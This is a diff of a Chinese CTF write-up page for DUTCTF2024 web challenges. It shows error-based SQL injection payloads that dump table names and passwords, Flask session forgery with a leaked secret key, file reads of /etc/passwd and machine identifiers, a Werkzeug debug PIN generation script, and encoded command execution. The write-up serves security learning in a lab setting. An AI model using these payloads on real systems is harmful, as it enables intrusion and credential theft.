@@ -13,39 +13,50 @@
 <p>第二个参数是文件需要更新的位置，即Xpath路径</p>
 <p>第三个参数是文件更新后的内容</p>
 <p>所以在采用报错注入的时候，第一个和第三个是随便写的，至于第二个嘛，就是注入的位置，待会看看Xpath</p>
-<p><img src="./DUTCTF2024/image-20240731130352283.png" alt="image-20240731130352283"></p>
+
+
 <p>:::</p>
 <p>一个简单的登录系统想要检查有无漏洞就需要最朴素的检测方式</p>
 <p>引号闭合</p>
-<p><img src="./DUTCTF2024/1.png" alt="1"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/1.png" class="" width="1">
+
 <p>这里测字段不多说，1‘ order by 1#即可（有3个字段）</p>
 <p>报错注入试试</p>
 <p><code>1&#39; and updatexml(0,concat(0x7e,database()),0)#</code></p>
-<p><img src="./DUTCTF2024/2.png" alt="2"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/2.png" class="" width="2">
+
 <p>然后就是正常的爆列表爆字段了</p>
 <p><code>1&#39; and updatexml(0,concat(0x7e,substr((select table_name from information_schema.tables where table_schema = &#39;FreakingData&#39; limit 0,1),1,40)),0)#</code></p>
-<p><img src="./DUTCTF2024/3.png" alt="3"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/3.png" class="" width="3">
+
 <p>==（limit 0,1这一部分指的是全表扫描到第0条后截取一条数据，所以会存在只有一条数据的情况）==</p>
 <p><code>1&#39; and updatexml(0,concat(0x7e,substr((select column_name from information_schema.columns where table_name = &#39;SPRING_SESSION&#39; limit 0,1),1,40)),0)#</code></p>
 <p><code>1&#39; and updatexml(0,concat(0x7e,substr((select column_name from information_schema.columns where table_name = &#39;users&#39; limit 0,1),1,40)),0)#</code></p>
 <p><code>1&#39; and updatexml(0,concat(0x7e,substr((select password from users limit 0,1),1,40)),0)#</code></p>
-<p><img src="./DUTCTF2024/4.png" alt="4"></p>
-<p><img src="./DUTCTF2024/5.png" alt="5"></p>
-<p><img src="./DUTCTF2024/6.png" alt="6"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/4.png" class="" width="4">
+
+<img src="/2024/03/18/competition/202403/DUTCTF2024/5.png" class="" width="5">
+
+<img src="/2024/03/18/competition/202403/DUTCTF2024/6.png" class="" width="6">
+
 <p>==（这一步会导致flag显示不全的原因是报错内容的长度限制为32，所以可以利用substr函数的特性，改变截取字符串的起点终点）==</p>
 <h2 id="Flask-File-Manager"><a href="#Flask-File-Manager" class="headerlink" title="Flask File Manager"></a>Flask File Manager</h2><p>开始时账号密码藏的稍微有点隐蔽，原本想要sql注入，但失败了</p>
 <p>经过测试，才知道账号为ctfer，密码为dutctf_2024_&gt; _&lt;（有个空格，把它忽略掉，估计是Markdown的一些冲突）</p>
 <p>这里我不说废话，直接开门见山，讲一下我认为不可行的路径</p>
 <p>首先是传:horse:，这里传入一句话木马上去之后想要读取1.php，但会报permission denied</p>
-<p><img src="./DUTCTF2024/11.png" alt="11"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/11.png" class="" width="11">
+
 <p>或者说你想进入upload目录，但是路由没有，说明文件不在我们常见的目录下</p>
-<p><img src="./DUTCTF2024/12.png" alt="12"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/12.png" class="" width="12">
+
 <p>目前有点一筹莫展的</p>
 <p>做题时无意间找到出题人留下的题目文件</p>
 <p>发现app.py有个error路由，且这题与flask有关，猜测可能是flask报错引起的漏洞</p>
-<p><img src="./DUTCTF2024/13.png" alt="13"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/13.png" class="" width="13">
+
 <p>成功进入到debug模式</p>
-<p><img src="./DUTCTF2024/14.png" alt="14"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/14.png" class="" width="14">
+
 <p>显然，一道flask pin的题目</p>
 <p>+++info  谈谈flask pin</p>
 <p>为了得到pin码，我们需要以下6个值</p>
@@ -64,40 +75,50 @@
 
 <p>注意到<code>/update_permissions</code>有对管理员的身份进行检测，且开头处给出了secretkey，猜测有flask session伪造</p>
 <p>先decode</p>
-<p><img src="./DUTCTF2024/15.png" alt="15"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/15.png" class="" width="15">
+
 <p>根据提示，来到出题人的github中，找到相关题目的commit</p>
-<p><img src="./DUTCTF2024/image-20240325165122168.png" alt="image-20240325165122168"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325165122168.png" class="" title="image-20240325165122168">
+
 <p>找到SECRET_KEY</p>
 <p>然后把相关权限改一下之后加密</p>
-<p><img src="./DUTCTF2024/image-20240325170051367.png" alt="image-20240325170051367"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325170051367.png" class="" title="image-20240325170051367">
+
 <p>然后update permissions</p>
 <p>把根目录的读权限交给ctfer</p>
-<p><img src="./DUTCTF2024/image-20240325174306046.png" alt="image-20240325174306046"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325174306046.png" class="" title="image-20240325174306046">
+
 <p>然后根据解pin码的需求找到6个相关的数据</p>
 <p>读取/etc/passwd</p>
-<p><img src="./DUTCTF2024/image-20240325174344172.png" alt="image-20240325174344172"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325174344172.png" class="" title="image-20240325174344172">
+
 <p>flask登录的用户名是<code>root</code></p>
 <p>modname默认值为<code>flask.app</code></p>
 <p>appname默认值为<code>Flask</code></p>
 <p>moddir（flask下的绝对路径）可以通过报错界面来得知：<code>/usr/local/lib/python3.9/site-packages/flask/app.py</code></p>
 <p>网络mac可以通过<code>/sys/class/net/eth0/address</code>获得</p>
-<p><img src="./DUTCTF2024/image-20240325175106383.png" alt="image-20240325175106383"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325175106383.png" class="" title="image-20240325175106383">
+
 <p>中间冒号去掉后得到的数转换为十进制就是我们需要的值：<code>2485376909319</code></p>
 <p>docker机器的id可以通过<code>/etc/machine-id</code>或者<code>/proc/sys/kernel/random/boot_id</code>得到：<code>c5391a8d-9aa2-4478-9b74-012e3e76e356</code></p>
-<p><img src="./DUTCTF2024/image-20240325175404256.png" alt="image-20240325175404256"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325175404256.png" class="" title="image-20240325175404256">
+
 <p>六个值都得到了，现在来写脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.9/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376909319&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c5391a8d-9aa2-4478-9b74-012e3e76e356&#x27;</span> <span class="comment"># 按道理来说这里是machine_id或者boot_id与/proc/self/cgroup，但我访问之后却发现是空，所以我直接把boot_id放上去了，不影响解题</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
 
 <p>解出pin码后应该就可以通过了</p>
 <p>读取flag</p>
-<p><img src="./DUTCTF2024/image-20240325180751124.png" alt="image-20240325180751124"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/image-20240325180751124.png" class="" title="image-20240325180751124">
+
 <h2 id="WeirdBash"><a href="#WeirdBash" class="headerlink" title="WeirdBash"></a>WeirdBash</h2><p>一个简单的编码系统，先看看能得出什么</p>
-<p><img src="./DUTCTF2024/7.png" alt="7"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/7.png" class="" width="7">
+
 <p>经过数次编码，推测是每个字母数字符号都有一个唯一的noob编码，组合起来的字符串在编码后变成每个字符编码连起来的形式</p>
 <p>尝试输入敏感命令，但都只是被编码，没有任何多余的操作</p>
 <p>考虑输入一些敏感信息，如flag，/etc/passwd等</p>
 <p>输入dutctf发现奇怪的编码</p>
-<p><img src="./DUTCTF2024/8.png" alt="8"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/8.png" class="" width="8">
+
 <p>猜测是一个含有敏感信息的语句</p>
 <p>这个可以一个个字符输出来作为对照表，也可以写脚本直接秒</p>
 <p>脚本如下：</p>
@@ -105,9 +126,11 @@
 
 <p>这句话大致意思就是让我们进入noob目录下面，有东西</p>
 <p>进入到noob目录下</p>
-<p><img src="./DUTCTF2024/9.png" alt="9"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/9.png" class="" width="9">
+
 <p>发现是noob解码，可以考虑将命令进行noob编码后再解码得到命令执行后的结果，<del>感觉跟序列化和反序列化的效果差不多</del>{. info}</p>
-<p><img src="./DUTCTF2024/10.png" alt="10"></p>
+<img src="/2024/03/18/competition/202403/DUTCTF2024/10.png" class="" width="10">
+
 <p>（这里是ls编码之后的结果）</p>
 <p>之后cat /flag即可</p>
 <h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><p>test3</p>
